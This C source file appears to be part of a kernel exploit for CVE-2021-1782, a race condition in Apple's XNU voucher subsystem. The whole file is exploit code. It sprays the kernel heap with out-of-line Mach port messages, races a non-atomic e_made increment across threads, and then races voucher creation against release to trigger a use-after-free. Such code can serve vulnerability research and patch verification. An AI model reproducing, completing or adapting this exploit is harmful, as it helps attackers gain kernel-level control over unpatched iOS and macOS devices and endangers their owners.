#include <mach/mach.h>
#include <pthread.h>

#include "cve_2021_1782.h"
#include "helper.h"
#include "spray.h"
#include "voucher.h"

#define WAIT 0
#define START 1
#define DONE 2

mach_port_t target_port;
mach_port_t *spray_ports, *before_ports, *after_ports;
volatile int sync_threads;
volatile mach_port_t voucher;
mach_voucher_attr_recipe_t store_recipe;

void * create_thread(void *arg) {
    mach_voucher_attr_recipe_t store_recipe;

    store_recipe = *(mach_voucher_attr_recipe_t *)arg;

    while (sync_threads == WAIT) {}
    voucher = create_voucher(CONTENT_SIZE, store_recipe);

    return NULL;
}

void * release_thread(void *arg) {
    mach_port_t voucher_port;

    voucher_port = *(mach_port_t *)arg;

    while (sync_threads == WAIT) {}
    release_voucher(voucher_port);

    return NULL;
}

void * inc_emade_thread(void *arg) {
    mach_port_t previous_voucher;
    int i;
    uint64_t id;

    
    id = *(uint64_t *)arg;
    previous_voucher = voucher;
    while (sync_threads == WAIT) {}
    multiple_redeem_voucher(CONTENT_SIZE, id, previous_voucher);

    return NULL;
}

void init_attempt(int id) {
    store_recipe = create_voucher_recipe(CONTENT_SIZE, id);
}

void clear_attempt() {
    mach_port_destroy(mach_task_self(), voucher);
    ool_ports_descriptor_receive_many(before_ports, N_BEFORE_PORTS, OOL_MESSAGES);
    ool_ports_descriptor_receive_many(after_ports, N_AFTER_PORTS, OOL_MESSAGES);
}

void init_exploit() {
    prepare_ports(&before_ports, &after_ports, &target_port);
    spray_ports = prepare_spray_ports(target_port);
}

mach_port_t prepare_heap() {
    ool_ports_descriptor_spray_many(before_ports, N_BEFORE_PORTS, OOL_MESSAGES, spray_ports, OOL_PORTS);
    voucher = create_voucher(CONTENT_SIZE, store_recipe);
    ool_ports_descriptor_spray_many(after_ports, N_AFTER_PORTS, OOL_MESSAGES, spray_ports, OOL_PORTS);

    return voucher;
}

mach_port_t trigger_uaf(int id) {
    int i;
    pthread_t create, release;
    pthread_t inc_emade[EMADE_RACE_THREAD];

    mach_port_t voucher_to_release;

    voucher = prepare_heap();

    sync_threads = WAIT;
    // race e_made++ (non-atomic increment)
    for (i = 0; i < EMADE_RACE_THREAD; i++) {
        pthread_create(&inc_emade[i], NULL, inc_emade_thread, (void *)&id);
    }

    sync_threads = START;
    for (i = 0; i < EMADE_RACE_THREAD; i++) {
        pthread_join(inc_emade[i], NULL);
    }
     
    sync_threads = WAIT;
    pthread_create(&create, NULL, create_thread, (void *)&store_recipe);
    voucher_to_release = voucher;
    pthread_create(&release, NULL, release_thread, (void *)&voucher_to_release);
  
    sync_threads = START;
    pthread_join(create, NULL);
    pthread_join(release, NULL);

    return voucher;
}